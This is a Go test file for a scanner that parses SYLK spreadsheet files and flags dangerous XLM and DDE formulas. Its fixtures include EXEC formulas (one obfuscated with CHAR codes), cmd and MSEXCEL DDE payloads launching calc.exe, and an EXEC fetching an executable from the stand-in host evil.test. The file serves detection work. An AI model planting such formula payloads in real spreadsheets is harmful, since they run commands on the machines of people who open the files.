package extract

import (
	"strings"
	"testing"
	"time"
)

func TestIsSLK(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"ID;PWXL;N;E\r\n", true},
		{"ID;P\n", true},
		{"\xEF\xBB\xBFID;PWXL\n", true}, // BOM-prefixed
		{"C;Y1;X1;EEXEC()\n", false},    // starts with a cell record, not ID
		{"col1,col2,col3\n", false},     // CSV
		{"", false},
	}
	for _, c := range cases {
		if got := isSLK([]byte(c.in)); got != c.want {
			t.Errorf("isSLK(%q) = %v, want %v", c.in, got, c.want)
		}
	}
}

func TestSplitSLKFields(t *testing.T) {
	got := splitSLKFields("C;Y1;X1;EEXEC(\"a;;b\")")
	want := []string{"C", "Y1", "X1", `EEXEC("a;b")`}
	if len(got) != len(want) {
		t.Fatalf("got %v want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("field %d: got %q want %q", i, got[i], want[i])
		}
	}
}

func TestSLKExpressionField(t *testing.T) {
	if got := slkExpressionField([]byte("C;Y1;X1;K5;E=EXEC(\"calc\")")); got != `=EXEC("calc")` {
		t.Fatalf("got %q", got)
	}
	if got := slkExpressionField([]byte("C;Y1;X1;K5")); got != "" {
		t.Fatalf("no E-field should yield empty, got %q", got)
	}
}

func TestIsSLKDDE(t *testing.T) {
	if !isSLKDDE("=cmd|'/c calc.exe'!A1") {
		t.Error("cmd DDE form not detected")
	}
	if !isSLKDDE(`=MSEXCEL|'\..\..\x'!A1`) {
		t.Error("msexcel DDE form not detected")
	}
	if isSLKDDE("=EXEC(\"calc\")") {
		t.Error("plain XLM call must not be flagged DDE")
	}
	if isSLKDDE("=SUM(A1:A2)") {
		t.Error("benign formula flagged DDE")
	}
}

func TestFromSLK_ExecFold(t *testing.T) {
	doc := "ID;PWXL;N;E\r\n" +
		"C;Y1;X1;E=EXEC(CHAR(99)&CHAR(97)&CHAR(108)&CHAR(99))\r\n" +
		"E\r\n"
	var res Result
	fromSLK([]byte(doc), &res, time.Time{})
	if !res.IsSLK {
		t.Fatal("IsSLK not set")
	}
	if !res.HasXLMFold {
		t.Fatal("HasXLMFold not set")
	}
	var sawDanger bool
	for _, s := range res.Streams {
		if string(s) == "XLM-DANGEROUS-FUNC EXEC" {
			sawDanger = true
		}
	}
	if !sawDanger {
		t.Fatalf("EXEC danger marker not emitted; streams=%q", res.Streams)
	}
}

func TestFromSLK_DDEMarker(t *testing.T) {
	doc := "ID;PWXL;N;E\n" +
		"C;Y1;X1;E=cmd|'/c calc.exe'!A1\n"
	var res Result
	fromSLK([]byte(doc), &res, time.Time{})
	var sawDDE bool
	for _, s := range res.Streams {
		if strings.HasPrefix(string(s), "SLK-DDE ") && strings.Contains(string(s), "calc.exe") {
			sawDDE = true
		}
	}
	if !sawDDE {
		t.Fatalf("SLK-DDE marker not emitted; streams=%q", res.Streams)
	}
}

func TestFromSLK_LineCapBounded(t *testing.T) {
	// Many blank lines past the cap must not be processed (and must not OOM):
	// the iterative bytes.Cut loop stops at maxSLKLines regardless of input size.
	var b strings.Builder
	b.WriteString("ID;PWXL;N;E\n")
	for i := 0; i < maxSLKLines+1000; i++ {
		b.WriteString("\n")
	}
	b.WriteString("C;Y1;X1;E=EXEC(\"calc\")\n") // past the cap — must NOT be folded
	var res Result
	fromSLK([]byte(b.String()), &res, time.Time{})
	for _, s := range res.Streams {
		if strings.Contains(string(s), "EXEC") {
			t.Fatal("formula past maxSLKLines was processed — cap not enforced")
		}
	}
}

func TestExtract_SLKDispatch(t *testing.T) {
	doc := "ID;PWXL;N;E\nC;Y1;X1;E=EXEC(\"http://evil.test/x.exe\")\n"
	res := Extract([]byte(doc), time.Time{})
	if !res.IsSLK || !res.IsDoc {
		t.Fatalf("SLK not dispatched: IsSLK=%v IsDoc=%v", res.IsSLK, res.IsDoc)
	}
	var sawURL bool
	for _, s := range res.Streams {
		if strings.Contains(string(s), "http://evil.test/x.exe") {
			sawURL = true
		}
	}
	if !sawURL {
		t.Fatalf("folded URL not surfaced; streams=%q", res.Streams)
	}
}
